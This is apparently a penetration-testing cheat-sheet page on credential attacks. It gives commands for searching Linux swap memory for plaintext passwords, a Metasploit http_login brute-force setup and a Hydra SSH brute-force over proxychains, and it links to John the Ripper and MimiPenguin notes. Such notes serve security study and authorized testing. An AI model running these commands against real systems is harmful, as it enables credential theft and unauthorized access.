# Linux Passwd / Shadow
### [Password Hashes](../../Services/Cryptography/Hashes/README.md#Shadow-File-Password-Hashes)

### John The Ripper
##### [Unshadow Linux Hashes Cracking](../../Tools/Credentials_Cryptography/JohnTheRipper/README.md#Unshadow-for-Linux-Hashes-Cracking)

##### [Crack Linux Hashes](../../Tools/Credentials_Cryptography/JohnTheRipper/README.md#Crack-Linux-Hashes)

### MimiPenguin
##### [Run as Shell Script](../../Tools/Credentials_Cryptography/MimiPenguin/README.md#Run-as-Shell-Script)

##### [Run as Python Script](../../Tools/Credentials_Cryptography/MimiPenguin/README.md#Run-as-Python-Script)

### From Swap Memory
##### Find Swap File
```bash
swapon -s

cat /proc/swaps
```
##### Look for Passwords
```bash
# Assuming found swap file as /dev/sda5
strings /dev/sda5 | grep "password="
strings /dev/sda5 | grep "&password="
```
##### [Using Swap Digger](../../Tools/Credentials/SwapDigger/README.md#Find-Passwords-in-Swap-File)

# Services
### HTTP Credentials
##### Metasploit http_login
```bash
msfconsole -q
use auxiliary/scanner/http/http_login
set RHOSTS [Target Host]
set AUTH_URI [Directory]
set USER_FILE [Username List]
set PASS_FILE [Password List]
set VERBOSE false
run
```

### SSH
##### Bruteforce SSH over Proxychains
```bash
proxychains hydra -l administrator -P [Password List] [Target Host] ssh
```


# References
[statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

[smtp-user-enum](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)

[smtp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum/)

[smb_login](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login/)

[owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)

[Reverse brute-force attack](https://en.wikipedia.org/wiki/Brute-force_attack#Reverse_brute-force_attack)

[NT PW Recovery "booting the kernel"](https://community.infosecinstitute.com/discussion/97802/nt-pw-recovery-booting-the-kernel)

[Reset Windows 10 Local Password with Kali Linux Live USB](https://www.top-password.com/knowledge/reset-windows-10-password-with-kali-linux.html)